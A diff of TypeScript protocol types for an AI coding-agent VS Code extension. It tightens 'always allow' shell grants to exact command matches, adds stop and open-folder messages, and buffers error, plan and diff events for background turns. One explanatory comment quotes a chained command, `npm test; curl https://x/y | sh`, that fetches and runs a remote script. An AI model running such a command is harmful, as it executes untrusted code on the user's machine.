@@ -219,14 +219,19 @@ export interface ConfigDto {
    */
   extensionVersion: string;
   /**
-   * Shell commands the user has said "always allow" to, by first token.
+   * Shell commands the user has said "always allow" to, in full.
    *
-   * A grant made in the transcript was permanent, workspace-wide, keyed on the
-   * command's FIRST WORD, and reachable from nowhere: it lived in
-   * workspaceState and appeared in no surface, no protocol message and no
-   * setting. So saying yes once to `git status` authorised `git push --force`
-   * for good, and there was no screen on which to discover that or take it
-   * back. Carried here so the Control Center can list it and revoke it.
+   * WHOLE COMMAND LINES, matched exactly. The grant used to be keyed on the
+   * command's FIRST WORD, which is a word match standing in for a permission
+   * decision about a string that then goes to a shell: saying yes once to
+   * `git status` authorised `git push --force` for good, and `npm test` - the
+   * most natural first-day approval there is - authorised
+   * `npm test; curl https://x/y | sh`. A command carrying a shell operator is
+   * never remembered at all, because a standing grant for it could not mean
+   * what the card said.
+   *
+   * Carried here so the Control Center can list every grant and revoke it; the
+   * old ones lived in workspaceState and appeared on no surface at all.
    */
   alwaysAllowedCommands: string[];
   ui: UiConfigDto;
@@ -268,6 +273,13 @@ export interface ModelGroupDto {
 export interface AgentMcpDto {
   server: string;
   include: string[];
+  /**
+   * Whether an include list was written at all. Carried across because the
+   * label depends on it: an empty include means NO tools on this server, and
+   * a surface that reads `include.length` as "is it filtered" would draw that
+   * as unfiltered - the same inversion the host had.
+   */
+  includeActive: boolean;
   exclude: string[];
 }
 
@@ -427,7 +439,22 @@ export interface StateSync {
 
 /* ───────────────────────────── inbound messages ───────────────────────── */
 
-export interface ReadyMsg { type: "ready" }
+export interface ReadyMsg {
+  type: "ready";
+  /**
+   * The build the FRONTEND was served from, echoed back so the host can tell
+   * whether the two halves agree.
+   *
+   * The contract in this file is enforced entirely by TypeScript at build
+   * time. At runtime both sides switch on `type` and silently ignore what they
+   * do not recognise, and nothing detected a disagreement - so a webview VS
+   * Code served from its cache after an update produced a control that did
+   * nothing, with no error and no log line. Optional, because a cached
+   * frontend from before this existed will not send it, and that is itself the
+   * signal.
+   */
+  build?: string;
+}
 export interface SendMessageMsg {
   type: "sendMessage";
   text: string;
@@ -469,7 +496,26 @@ export interface HealthCheckMsg { type: "healthCheck" }
  * the user is still typing, rather than after they press Enter.
  */
 export interface WarmMsg { type: "warm" }
+/**
+ * Open a workspace folder, from the panel's own first-run screen.
+ *
+ * With no folder open there is nothing for Genesis to read profiles from and
+ * nothing for it to edit, and that screen said so while offering no way to act
+ * on it - so the first thing a new user saw was a dead end.
+ */
+export interface OpenFolderMsg { type: "openFolder" }
 export interface InterruptMsg { type: "interrupt" }
+/**
+ * Stop a turn running in a conversation that is not on screen.
+ *
+ * `interrupt` deliberately reaches only the visible turn - Stop is a button in
+ * a chat and means "stop this". That left a backgrounded turn with no way to
+ * be stopped at all: one blocked on an approval the user never saw asked, or
+ * inside a ten-minute command, ran until the window was reloaded while the
+ * history list marked its conversation as working. This is the control the
+ * history list needed to have.
+ */
+export interface StopSessionMsg { type: "stopSession"; id: string }
 export interface NewChatMsg { type: "newChat" }
 export interface SetPhaseMsg { type: "setPhase"; phase: Phase }
 export interface ApprovePlanMsg { type: "approvePlan" }
@@ -600,7 +646,8 @@ export interface McpReloadMsg { type: "mcpReload" }
 
 export type InboundMessage =
   | ReadyMsg | SendMessageMsg | AttachFilesMsg | AttachPathsMsg | WarmMsg | McpOpenConfigMsg
-  | ListModelsMsg | HealthCheckMsg | InterruptMsg | NewChatMsg | SetPhaseMsg
+  | ListModelsMsg | HealthCheckMsg | InterruptMsg | StopSessionMsg | OpenFolderMsg
+  | NewChatMsg | SetPhaseMsg
   | ApprovePlanMsg | ResolvePermissionMsg | ResolveDiffMsg | SelectModelMsg
   | RunTraceMsg | SaveCaBundleMsg | BrowseCaBundleMsg | UseSystemTrustMsg
   | CopyTextMsg | NewEndpointMsg | SaveEndpointMsg | DeleteEndpointMsg
@@ -840,7 +887,17 @@ export interface CheckpointsListedOut {
   checkpoints: CheckpointDto[];
 }
 export interface CheckpointRestoredOut { type: "checkpointRestored"; hash: string }
-export interface BundleExportedOut { type: "bundleExported"; path: string }
+export interface BundleExportedOut {
+  type: "bundleExported";
+  path: string;
+  /**
+   * How many credentials the export found in the workspace's own config and
+   * replaced in the copy. Zero is the ordinary case and the panel says nothing
+   * about it; anything else is worth a line, because the values are still in
+   * plain text in the files the bundle was made FROM.
+   */
+  redactions: number;
+}
 /** Confirmation that `exportChat` wrote a file, and what went into it. */
 export interface ChatExportedOut {
   type: "chatExported";
@@ -995,7 +1052,18 @@ export type ReplayableEvent =
   | StreamDeltaOut | ThinkingOut | ToolStartOut | ToolEndOut
   | TodosUpdatedOut | ImageGeneratedOut | FileTouchedOut | ChangesUpdatedOut
   | PermissionRequestOut | ContextUsageOut | SteerAcceptedOut
-  | ErrorOut | PlanProposedOut;
+  // An error and a plan card are the turn's OUTPUT, and both were sent with
+  // `show()`, which paints only when the turn's conversation is on screen and
+  // buffers nothing. A turn that failed while the user read another chat
+  // reported it to nobody, ever, and a reload lost it.
+  | ErrorOut | PlanProposedOut
+  // A diff card belongs to the turn that produced it, for the same reason a
+  // permission request does: it is a question about that turn's work, waiting
+  // on an answer. Broadcast unconditionally, a background turn's cards
+  // appeared over whatever conversation was on screen - an invitation to
+  // accept a change you never watched being made - and a webview reload lost
+  // the ones still pending.
+  | DiffPendingOut;
 
 /** Narrowing helper for host-side switch statements. */
 export type InboundOf<T extends InboundType> = Extract<InboundMessage, { type: T }>;
